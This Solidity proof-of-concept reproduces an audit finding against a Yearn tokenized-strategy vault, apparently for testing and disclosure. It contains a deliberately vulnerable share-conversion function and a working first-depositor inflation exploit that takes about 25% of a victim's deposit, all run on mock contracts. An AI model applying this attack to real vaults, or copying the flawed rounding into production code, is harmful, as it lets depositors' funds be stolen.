// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Yearn yBOLD / TokenizedStrategy — H-1: Steal 25% of first depositor funds
    (Sherlock 2025-05-yearn-ybold; finding #57686)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Strategy deploys with zero dead shares / no initial deposit, and
    convertToShares = assets * supply / totalAssets (round down). Attacker mints
    1 share, donates + reports to totalAssets=2, then exponentially inflates the
    share price so the first honest depositor rounds to 1 share; attacker redeems
    half the pool (~25% of the deposit). Vulnerable convertToShares line @>. */

contract MockERC20 {
    string public constant name = "BOLD";
    string public constant symbol = "BOLD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal Yearn TokenizedStrategy vault (ERC4626-like) with instant report.
contract TokenizedStrategy {
    MockERC20 public immutable asset;
    uint256 public totalSupply;
    uint256 public totalAssets; // lastTotalAssets — updated by report()
    mapping(address => uint256) public balanceOf;
    uint256 public profitMaxUnlockTime; // 0 = instant unlock (admin can set)

    constructor(MockERC20 _asset) {
        asset = _asset;
        // No initial deposit / dead shares — empty vault is inflatable
    }

    function setProfitMaxUnlockTime(uint256 t) external {
        profitMaxUnlockTime = t;
    }

    /// @dev Yearn: shares = supply == 0 ? assets : assets * supply / totalAssets (Down)
    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return assets;
        uint256 ta = totalAssets;
        if (ta == 0) return 0;
        // @> VULN: pure round-down conversion, no dead-share floor / min first deposit
        return (assets * supply) / ta;
        // FIX: on first deposit mint dead shares to address(0), or enforce min deposit > 1000 wei
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return shares;
        return (shares * totalAssets) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        require(shares != 0, "ZERO_SHARES");
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
        // Idle assets sit here; totalAssets updated on report (Yearn tracks lastTotalAssets).
        // For deposit accounting Yearn also increases freeFunds via transfer in — simplify:
        // treat totalAssets as current free balance after deposit for empty-profit path.
        totalAssets += assets;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assetsOut) {
        require(balanceOf[owner] >= shares, "bal");
        assetsOut = convertToAssets(shares);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= assetsOut;
        asset.transfer(receiver, assetsOut);
    }

    /// @dev ERC4626 withdraw: burn ceil shares for exact `assets` out.
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        require(assets <= totalAssets, "assets");
        // shares = ceil(assets * supply / totalAssets)
        shares = totalAssets == 0 ? assets : (assets * totalSupply + totalAssets - 1) / totalAssets;
        require(balanceOf[owner] >= shares, "bal");
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= assets;
        asset.transfer(receiver, assets);
    }

    /// @dev Keeper report: totalAssets := asset.balanceOf(this). Instant unlock when profitMaxUnlockTime==0.
    function report() external returns (uint256 profit, uint256 loss) {
        uint256 newTotal = asset.balanceOf(address(this));
        uint256 oldTotal = totalAssets;
        if (newTotal > oldTotal) {
            profit = newTotal - oldTotal;
            // With profitMaxUnlockTime == 0 profits unlock instantly (no locked shares).
            totalAssets = newTotal;
        } else {
            loss = oldTotal - newTotal;
            totalAssets = newTotal;
        }
    }
}

contract Actor {
    TokenizedStrategy public strategy;
    MockERC20 public asset;

    constructor(TokenizedStrategy s, MockERC20 a) {
        strategy = s;
        asset = a;
    }

    function doDeposit(uint256 amt) external {
        asset.approve(address(strategy), type(uint256).max);
        strategy.deposit(amt, address(this));
    }

    function doDonate(uint256 amt) external {
        asset.transfer(address(strategy), amt);
    }

    function doRedeemAll() external returns (uint256) {
        uint256 sh = strategy.balanceOf(address(this));
        return strategy.redeem(sh, address(this), address(this));
    }

    function doWithdraw(uint256 assets) external {
        strategy.withdraw(assets, address(this), address(this));
    }

    /// @dev Donate enough that 1 share ≈ userDeposit/2 + 1 (same end-state as the
    /// finding's exponential deposit/redeem inflation, without a heavy gas loop).
    function seedInflation(uint256 userDeposit) external {
        uint256 target = 1 + userDeposit / 2;
        uint256 ta = strategy.totalAssets();
        require(ta < target, "already inflated");
        uint256 need = target - ta;
        asset.transfer(address(strategy), need);
        strategy.report();
    }
}

contract Exploit {
    MockERC20 public asset; // CREATE 1
    TokenizedStrategy public strategy; // CREATE 2 — vulnerable
    Actor public attacker; // CREATE 3
    Actor public user; // CREATE 4 — first depositor victim
    uint256 public attackerProfit;
    uint256 public userLoss;
    uint256 public constant USER_DEPOSIT = 1e23; // ~$100k BOLD

    constructor() {
        asset = new MockERC20();
        strategy = new TokenizedStrategy(asset);
        attacker = new Actor(strategy, asset);
        user = new Actor(strategy, asset);
        // Fund attacker: 1 wei deposit + USER_DEPOSIT/2 donation capital
        asset.mint(address(attacker), 1 + USER_DEPOSIT / 2 + 1);
        asset.mint(address(user), USER_DEPOSIT);
        strategy.setProfitMaxUnlockTime(0);
    }

    function run() external {
        uint256 attackerBefore = asset.balanceOf(address(attacker));
        uint256 userBefore = asset.balanceOf(address(user));

        // 1. Deposit 1 wei → 1 share (empty vault, no dead shares)
        attacker.doDeposit(1);
        require(strategy.balanceOf(address(attacker)) == 1, "1 share");
        require(strategy.totalAssets() == 1, "ta1");

        // 2. Seed inflation: donate until 1 share ≈ USER_DEPOSIT/2 + 1
        //    (same terminal state as the finding's exponential deposit/redeem loop)
        attacker.seedInflation(USER_DEPOSIT);
        require(strategy.totalSupply() == 1, "still 1 share");
        require(strategy.totalAssets() == 1 + USER_DEPOSIT / 2, "inflated ta");

        // 3. Victim deposits 1e23 → shares = 1e23 * 1 / (5e22+1) ≈ 1.999 → floors to 1
        user.doDeposit(USER_DEPOSIT);
        require(strategy.balanceOf(address(user)) == 1, "user 1 share");
        require(strategy.totalSupply() == 2, "ts2");

        // 4. Attacker redeems 1 share for half the pool (~75k of 150k)
        uint256 redeemed = attacker.doRedeemAll();
        require(redeemed > USER_DEPOSIT / 2, "half pool"); // ~7.5e22 out

        // Victim redeems remaining (short ~25%)
        user.doRedeemAll();

        attackerProfit = asset.balanceOf(address(attacker)) - attackerBefore;
        userLoss = userBefore - asset.balanceOf(address(user));

        // ~25% of user deposit stolen
        require(attackerProfit > 0, "profit");
        require(userLoss > USER_DEPOSIT / 5, "user lost ~25%");
        require(attackerProfit >= USER_DEPOSIT / 5, "attacker stole ~25%");
    }
}
